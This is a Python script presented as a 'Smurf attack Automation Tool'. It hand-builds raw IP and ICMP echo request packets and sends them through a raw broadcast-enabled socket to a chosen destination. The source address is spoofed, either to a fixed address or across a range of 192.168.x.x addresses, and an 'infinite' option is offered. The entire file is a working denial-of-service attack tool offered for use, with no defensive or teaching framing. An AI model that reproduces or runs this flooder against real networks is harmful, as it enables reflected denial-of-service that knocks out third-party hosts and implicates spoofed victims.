import socket
import sys
from scapy.layers.l2 import arping
from scapy.all import *
import argparse
import re


def IPHeader(source, destination, proto):
    packet = b''
    packet += b'\x45'  # Version (IPv4) + Internet Protocol header length
    packet += b'\x00'  # no quality of service
    packet += b'\x00\x54'  # Total frame length
    packet += b'\x23\x2c'  # Id of this packet
    packet += b'\x40'  # Flags (Don't Fragment)
    packet += b'\x00'  # Fragment offset: 0
    packet += b'\x40'  # Time to live: 64
    packet += proto  # Protocol: ICMP (1)
    packet += b'\x0a\x0a'  # Checksum (python does the work for us)
    packet += socket.inet_aton(source)  # Set source IP to the supplied one
    packet += socket.inet_aton(destination)  # Set destination IP to the supplied one
    return packet


def CreateICMPRequest():
    packet = b''
    packet += b'\x08'  # ICMP Type:8 (icmp echo request)
    packet += b'\x00'  # Code 0 (no code)
    packet += b'\xbd\xcb'  # Checksum
    packet += b'\x16\x4f'  # Identifier (big endian representation)
    packet += b'\x00\x01'  # Sequence number (big endian representation)
    packet += b'\x92\xde\xe2\x50\x00\x00\x00\x00\xe1\xe1\x0e\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37'  # Data (56 bytes)
    return packet


def smurfattack(values, dspoof_rnd = ''):

    if dspoof_rnd:
        for j in range(256):
            src1 = "192.168." + str(j)
            for i in range(256):
                src = src1 + "." + str(i)
                if values.infinite == 'True':

                    main_proc(src, values.dest, values.number_of_request)


    else:
        main_proc(values.spoof, values.dest, values.number_of_request, values.infinite)


def main_proc(src, destination, number_of_request, infinite =''):
    
    try:
        icmpsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmpsocket.bind(('', 1))
        icmpsocket.setblocking(0)
        icmpsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        icmpsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        icmpsocket.connect((destination, 1))  
    except socket.error:
        print ("You need to be root!")
        sys.exit(0)

    try:
        counter = 1
        while counter <= int(number_of_request):

            print ("Sending %d icmp echo requests to %s with %s as source" % (
                    int(number_of_request), destination, src))

            icmpsocket.send(
                IPHeader(src, destination, proto=b'\x01') + CreateICMPRequest())  
            counter = int(counter) + 1

        icmpsocket.close()
       
    except KeyboardInterrupt:
        print ('Keyboard Interrupt')
        icmpsocket.close()

def main(args):
    
    if args.spoof and check(args.dest):
        if check(args.spoof):
            smurfattack(args)
        
    elif args.dspoof == 'RND' and check(args.dest):
        smurfattack(args, dspoof_rnd = args.dspoof)
    
    else:
        print('Please provide corrent Information')

def help_smurfattack():
    print ("Usage: smurfattack <source IP> <broadcast address> <number of requests> ")

regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
	
def check(Ip):
    if(re.search(regex, Ip)):
        return True
        
    else:
        print("Invalid Ip address")
	

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='Smurf attack Automation Tool')
    parser.add_argument("-spf","--spoof", help="Spoofed static Ip address, eg: -spf 10.10.10.10 ")
    parser.add_argument("-dspf","--dspoof", help="Spoofed dynamic Ip address, eg: -dpf RND")
    parser.add_argument("-d","--dest", help="Destination Addr, eg: -d ipv4")
    parser.add_argument("-n","--number_of_request", default=100 , help="Number of requests, eg: -n 500")
    parser.add_argument("-infi","--infinite",default=False , help="Number of requests infinitly, eg: -infi True")
    
    args = parser.parse_args()
    main(args)
    
